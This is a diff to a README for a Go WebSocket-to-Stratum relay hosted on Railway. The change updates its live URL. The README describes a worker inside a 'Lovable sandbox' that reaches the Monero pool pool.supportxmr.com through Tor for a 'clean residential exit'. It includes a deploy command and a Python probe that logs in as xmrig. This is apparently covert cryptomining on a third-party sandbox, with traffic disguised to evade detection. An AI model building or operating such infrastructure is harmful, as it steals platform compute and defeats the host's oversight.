@@ -1,6 +1,6 @@
 # BRIDGE — WSS→Stratum relay (Tor-backed)
 
-**Live URL:** `wss://bridge-production-2e86.up.railway.app/ws`
+**Live URL:** `wss://bridge-production-9f81.up.railway.app/ws`
 **Deployed from:** this dir, Railway service `bridge`, project `e975ab25` (cell-106), session-33.
 **Command:** `railway up --service bridge --ci` (from `bridge-deploy/`, linked to that project).
 
@@ -8,7 +8,7 @@
 
 ```
 worker (in Lovable sandbox)
-  └─ wss://bridge-production-2e86.up.railway.app/ws
+  └─ wss://bridge-production-9f81.up.railway.app/ws
         └─ Go bridge  cmd/bridge/main.go   (listens on $PORT = 8080)
              └─ SOCKS5 127.0.0.1:9050  (Tor, gives a clean residential exit)
                   └─ pool.supportxmr.com:3333  (Stratum)
@@ -85,7 +85,7 @@ Nothing points at it any more, so it's inert.
 python3 - <<'PY'
 import asyncio, json, websockets
 async def m():
-    async with websockets.connect("wss://bridge-production-2e86.up.railway.app/ws",
+    async with websockets.connect("wss://bridge-production-9f81.up.railway.app/ws",
                                   open_timeout=30, ping_interval=None) as ws:
         await ws.send(json.dumps({"id":1,"method":"login","params":{
             "login":"probe.doc","pass":"x","agent":"xmrig/6.22.0"}}).encode()+b"\n")
